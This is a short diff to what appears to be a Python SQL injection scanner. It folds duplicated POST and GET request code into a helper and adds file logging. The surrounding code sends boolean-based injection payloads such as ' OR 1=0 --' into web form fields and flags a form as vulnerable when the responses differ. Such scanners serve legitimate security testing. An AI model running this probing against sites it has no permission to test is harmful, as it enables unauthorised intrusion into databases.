@@ -30,20 +30,14 @@ def test_response(data, form_data, url, method, payload, false_payload, input_ta
         if form_data["action"] and form_data["action"] != "#"
         else url
     )
-    if form_data["method"] == "post":
-        response = requests.post(action_url, data=data)
-    elif form_data["method"] == "get":
-        response = requests.get(action_url, params=data)
-    else:
-        return
+    response = send_request(
+        action_url, data, form_data["method"]
+    )
     if input_tag["name"]:
         data[input_tag["name"]] = f"1{false_payload}"
-    if form_data["method"] == "post":
-        false_response = requests.post(action_url, data=data)
-    elif form_data["method"] == "get":
-        false_response = requests.get(action_url, params=data)
-    else:
-        return
+    false_response = send_request(
+        action_url, data, form_data["method"]
+    )
     if response.text != false_response.text:
         vulnerable = True
     return vulnerable
@@ -66,6 +60,10 @@ def boolean_based(form_data, url, method, output_file):
         " OR 1=0 --",
     ]
     print(f"{Fore.LIGHTYELLOW_EX}[*] Performing boolean based SQL injection...{Style.RESET_ALL}")
+    write_to_file(
+        output_file,
+        f"[*] Performing boolean based SQL Injection..."
+    )
     for payload, false_payload in zip(true_payloads, false_payloads):
         for input_tag in form_data["inputs"]:
             if input_tag["type"] == "submit":
